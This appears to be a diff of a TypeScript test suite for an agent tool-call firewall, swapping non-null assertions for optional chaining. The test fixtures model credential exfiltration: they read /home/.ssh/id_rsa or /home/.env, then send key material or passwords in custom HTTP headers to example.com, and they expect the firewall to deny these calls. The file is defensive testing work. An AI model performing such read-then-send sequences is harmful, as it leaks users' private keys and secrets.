@@ -97,7 +97,7 @@ describe("HTTP GET custom header exfiltration after sensitive read", () => {
 			toolClass: "file",
 			action: "read",
 			parameters: { path: "/home/.ssh/id_rsa" },
-			grantId: fileGrant.grant!.id,
+			grantId: fileGrant.grant?.id,
 		});
 
 		// Step 2: GET with a custom header — should be denied
@@ -110,7 +110,7 @@ describe("HTTP GET custom header exfiltration after sensitive read", () => {
 					url: "https://example.com/page",
 					headers: { "X-Data": "ssh-rsa AAAAB3NzaC1yc2E..." },
 				},
-				grantId: httpGrant.grant!.id,
+				grantId: httpGrant.grant?.id,
 			}),
 		).rejects.toThrow(ToolCallDeniedError);
 	});
@@ -123,7 +123,7 @@ describe("HTTP GET custom header exfiltration after sensitive read", () => {
 			toolClass: "file",
 			action: "read",
 			parameters: { path: "/home/.env" },
-			grantId: fileGrant.grant!.id,
+			grantId: fileGrant.grant?.id,
 		});
 
 		const httpGrant = fw.requestCapability("http.read");
@@ -135,7 +135,7 @@ describe("HTTP GET custom header exfiltration after sensitive read", () => {
 					url: "https://example.com/api",
 					headers: { "X-Secret": "password123" },
 				},
-				grantId: httpGrant.grant!.id,
+				grantId: httpGrant.grant?.id,
 			}),
 		).rejects.toThrow(ToolCallDeniedError);
 	});
@@ -148,7 +148,7 @@ describe("HTTP GET custom header exfiltration after sensitive read", () => {
 			toolClass: "file",
 			action: "read",
 			parameters: { path: "/home/.ssh/id_rsa" },
-			grantId: fileGrant.grant!.id,
+			grantId: fileGrant.grant?.id,
 		});
 
 		// Standard headers should still work
@@ -164,7 +164,7 @@ describe("HTTP GET custom header exfiltration after sensitive read", () => {
 					"Cache-Control": "no-cache",
 				},
 			},
-			grantId: httpGrant.grant!.id,
+			grantId: httpGrant.grant?.id,
 		});
 		expect(result.success).toBe(true);
 	});
@@ -177,7 +177,7 @@ describe("HTTP GET custom header exfiltration after sensitive read", () => {
 			toolClass: "file",
 			action: "read",
 			parameters: { path: "/home/.ssh/id_rsa" },
-			grantId: fileGrant.grant!.id,
+			grantId: fileGrant.grant?.id,
 		});
 
 		const httpGrant = fw.requestCapability("http.read");
@@ -185,7 +185,7 @@ describe("HTTP GET custom header exfiltration after sensitive read", () => {
 			toolClass: "http",
 			action: "get",
 			parameters: { url: "https://example.com/page" },
-			grantId: httpGrant.grant!.id,
+			grantId: httpGrant.grant?.id,
 		});
 		expect(result.success).toBe(true);
 	});
@@ -202,7 +202,7 @@ describe("HTTP GET custom header exfiltration after sensitive read", () => {
 				url: "https://example.com/api",
 				headers: { "X-Custom": "value" },
 			},
-			grantId: httpGrant.grant!.id,
+			grantId: httpGrant.grant?.id,
 		});
 		expect(result.success).toBe(true);
 	});
@@ -215,7 +215,7 @@ describe("HTTP GET custom header exfiltration after sensitive read", () => {
 			toolClass: "file",
 			action: "read",
 			parameters: { path: "/home/.ssh/id_rsa" },
-			grantId: fileGrant.grant!.id,
+			grantId: fileGrant.grant?.id,
 		});
 
 		try {
@@ -227,7 +227,7 @@ describe("HTTP GET custom header exfiltration after sensitive read", () => {
 					url: "https://example.com/page",
 					headers: { "X-Exfil": "data" },
 				},
-				grantId: httpGrant.grant!.id,
+				grantId: httpGrant.grant?.id,
 			});
 			expect.unreachable("should have thrown");
 		} catch (e) {
